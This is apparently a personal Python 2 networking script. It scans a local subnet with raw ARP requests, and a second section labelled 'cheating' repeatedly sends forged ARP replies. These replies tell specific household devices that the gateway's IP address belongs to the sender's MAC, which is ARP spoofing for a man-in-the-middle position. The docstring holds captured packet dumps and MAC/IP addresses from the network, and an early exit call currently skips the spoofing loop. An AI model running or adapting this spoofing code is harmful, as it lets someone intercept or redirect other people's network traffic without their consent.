#!/usr/bin/env python

'''
ETH eth = {
    ETH_HDR ethHdr = {
        MAC dst = 14:e6:e4:fd:83:b8
        MAC src = 58:a2:b5:9a:d1:5c
        uint16@ type = 2054
    }
    ETH_BODY(2054) ethBody = {
        ARP arp = {
            uint16@ hardType = 1
            uint16@ protoType = 2048
            uint8 hardLen = 6
            uint8 protoLen = 4
            uint16@ opType = 1
            MAC srcMac = 58:a2:b5:9a:d1:5c
            IPv4 srcIp = 192.168.1.106
            MAC dstMac = 00:00:00:00:00:00
            IPv4 dstIp = 192.168.1.1
        }
    }
}
192.168.1.106
0x806
ETH eth = {
    ETH_HDR ethHdr = {
        MAC dst = 58:a2:b5:9a:d1:5c
        MAC src = 14:e6:e4:fd:83:b8
        uint16@ type = 2054
    }
    ETH_BODY(2054) ethBody = {
        ARP arp = {
            uint16@ hardType = 1
            uint16@ protoType = 2048
            uint8 hardLen = 6
            uint8 protoLen = 4
            uint16@ opType = 2
            MAC srcMac = 14:e6:e4:fd:83:b8
            IPv4 srcIp = 192.168.1.1
            MAC dstMac = 58:a2:b5:9a:d1:5c
            IPv4 dstIp = 192.168.1.106
        }
    }
}

ETH eth = {
    ETH_HDR ethHdr = {
        MAC dst = ff:ff:ff:ff:ff:ff
        MAC src = 5c:96:9d:b3:47:00
        uint16@ type = 2054
    }
    ETH_BODY(2054) ethBody = {
        ARP arp = {
            uint16@ hardType = 1
            uint16@ protoType = 2048
            uint8 hardLen = 6
            uint8 protoLen = 4
            uint16@ opType = 1
            MAC srcMac = 5c:96:9d:b3:47:00
            IPv4 srcIp = 192.168.1.102
            MAC dstMac = 00:00:00:00:00:00
            IPv4 dstIp = 169.254.255.255
        }
    }
}

ETH eth = {
    ETH_HDR ethHdr = {
        MAC dst = 58:a2:b5:9a:d1:5c
        MAC src = 54:04:a6:7d:08:9d
        uint16@ type = 2054
    }
    ETH_BODY(2054) ethBody = {
        ARP arp = {
            uint16@ hardType = 1
            uint16@ protoType = 2048
            uint8 hardLen = 6
            uint8 protoLen = 4
            uint16@ opType = 1
            MAC srcMac = 54:04:a6:7d:08:9d
            IPv4 srcIp = 192.168.1.107
            MAC dstMac = 58:a2:b5:9a:d1:5c
            IPv4 dstIp = 192.168.1.106
        }
    }
}
192.168.1.107


	
14-E6-E4-FD-83-B8


5C-96-9D-9F-D7-84
192.168.1.102


'''

import socket, dpkt, sys, time
from proto import *
from net import *

p = EqParser()

fp = open('eth.proto', 'r')
text = fp.read()
fp.close()
p.execute(text, locals())

text = r'''
import('eth.proto')

bcMAC:MAC = "ff:ff:ff:ff:ff:ff"
unMAC:MAC = "00:00:00:00:00:00"
bcIP:IPv4 = "255.255.255.0"

gateMAC:MAC = "14:E6:E4:FD:83:B8"
gateIP:IPv4 = "192.168.1.1"

meMAC:MAC = "58:a2:b5:9a:d1:5c"
meIP:IPv4 = "192.168.1.105"

wwwwMAC:MAC = "5C:96:9D:9F:D7:84"
wwwwIP:IPv4 = "192.168.1.102"


padMAC:MAC = "5C:96:9D:B3:47:00"
padIP:IPv4 = "192.168.1.104"


#pcMAC:MAC = "54:04:A6:7D:08:9D"
pcMAC:MAC = "00:08:CA:66:BD:51"
pcIP:IPv4 = "192.168.1.101"

errMAC:MAC = "12:34:56:78:9a:bc"
errIP:IPv4 = "192.168.1.5"


targetMAC:MAC = bcMAC
targetIP:IPv4 = bcIP


eth:ETH
eth.ethHdr.dst = ""
eth.ethHdr.src = ""

eth.ethHdr.type = ETH_TYPE_ARP
arp:ARP = eth.ethBody.arp
arp.hardType = 1
arp.protoType = ETH_TYPE_IP
arp.hardLen = 6
arp.protoLen = 4
arp.opType = 0
arp.srcMac = eth.ethHdr.src

arp.srcIp = ""
arp.dstMac = ""
arp.dstIp = ""
'''
p.execute(text, locals())
eth = p.getVar('eth')



sk = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0))  # send only
ifname = len(sys.argv) > 1 and sys.argv[1]
if ifname:
    sk.bind((ifname, 0))


# find machine
print 'searching...'
text = r'''
eth.ethHdr.dst = bcMAC
eth.ethHdr.src = meMAC
arp.opType = 1
arp.srcMac = eth.ethHdr.src
arp.srcIp = meIP
arp.dstMac = unMAC
#arp.dstIp = <in ipList>
'''
p.execute(text, locals())
#ipList = ['192.168.1.%d' % i for i in range(2, 255)]
#ipList = ['192.168.1.80']
ipList = getipsbyam('192.168.21.140', '255.255.248.0')
for ipStr in ipList:
	p.setValue('arp.dstIp', ipStr)
	data = eth.encode()
	size = sk.send(data)
	print 'D|send|%s|%d/%d' % (ipStr, size, len(data))
	time.sleep(0.1)

exit(0)

#cheat machine
print 'cheating...'
addrList = {
'192.168.1.102':'5C:96:9D:9F:D7:84',  # wwwwPad
'192.168.1.100':'14:DA:E9:38:F9:3B',  # wwwwPc
'192.168.1.104':'5C:96:9D:B3:47:00'   # pad
''
}
text = r'''
#eth.ethHdr.dst = <in addrList>
eth.ethHdr.src = meMAC
arp.opType = 2
arp.srcMac = eth.ethHdr.src
arp.srcIp = gateIP
arp.dstMac = eth.ethHdr.dst
#arp.dstIp = <in addrList>
'''
p.execute(text, locals())

print eth.dump('str')
while True:
	for ipStr, macStr in addrList.iteritems():
		p.setValue('eth.ethHdr.dst', macStr)
		p.setValue('arp.dstIp',	ipStr)
		data = eth.encode()
		size = sk.send(data)
		print 'D|send|%d/%d' % (size, len(data))
		time.sleep(0.1)
	time.sleep(1)

sk.close()

